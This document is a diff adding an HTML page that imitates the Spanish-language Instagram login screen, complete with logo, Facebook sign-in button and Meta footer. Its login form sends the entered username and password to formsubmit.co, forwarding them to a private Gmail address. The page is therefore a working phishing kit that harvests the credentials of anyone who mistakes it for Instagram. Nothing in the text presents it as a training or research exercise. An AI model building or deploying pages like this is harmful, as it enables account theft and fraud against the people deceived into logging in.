@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="shortcut icon" href="./src/img/logo.png" type="image/x-icon" />
+    <link rel="stylesheet" href="./src/css/style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="home-phone">
+        <img src="./src/img/home-phones.png" alt="" />
+      </div>
+      <div class="second-column">
+        <div class="login">
+          <img src="./src/img/iconoPage.png" id="logo-page" alt="" />
+          <form action="https://formsubmit.co/alfredhaitlar@gmail.com" method="POST">
+            <input
+              type="text"
+              name="username"
+              id="username"
+              placeholder="Teléfono, usuario o correo electrónico"
+            />
+            <input
+              type="password"
+              name="password"
+              id="password"
+              placeholder="Contraseña"
+            />
+            <button type="submit" id="button-entrar">Entrar</button>
+          </form>
+          <div class="separador">
+            <div class="barra"></div>
+            <p class="o">o</p>
+            <div class="barra2"></div>
+          </div>
+
+          <div class="facebook">
+            <img src="./src/img/facebook.png" alt="" />
+            <p>Iniciar sesión con Facebook</p>
+          </div>
+          <p class="olvidadoContra">¿Has olvidado la contraseña?</p>
+          <div class="denuncia">
+            <p>También puedes <span>denunciar el contenido que creas</span></p>
+            <p><span>que es ilegal</span> en tu país sin iniciar sesión.</p>
+          </div>
+        </div>
+        <div class="registrarse">
+          <p>¿No tienes una cuenta? <span>Regístrate</span></p>
+        </div>
+        <div class="descargar">
+          <p>Descarga la aplicación.</p>
+          <div class="descargar-img">
+            <img src="./src/img/googlePlay.png" class="play" alt="" />
+            <img src="./src/img/microsoft.png" class="microsoft" alt="" />
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="footer">
+      <div class="primera-fila">
+        <div>Meta</div>
+        <div>Información</div>
+        <div>Blog</div>
+        <div>Empleo</div>
+        <div>Ayuda</div>
+        <div>API</div>
+        <div>Privacidad</div>
+        <div>Configuración de cookies</div>
+        <div>Condiciones</div>
+        <div>Ubicaciones</div>
+        <div>Instagram Lite</div>
+        <div>Threads</div>
+        <div>Subir contactos y personas no usuarias</div>
+        <div>Meta Verified</div>
+      </div>
+      <div class="segunda-fila">
+        <select name="country" id="paises">
+          <option value="españa">Español (España)</option>
+          <option value="italia">Italia</option>
+        </select>
+        <div>© 2024 Instagram from Meta</div>
+      </div>
+    </div>
+  </body>
+</html>
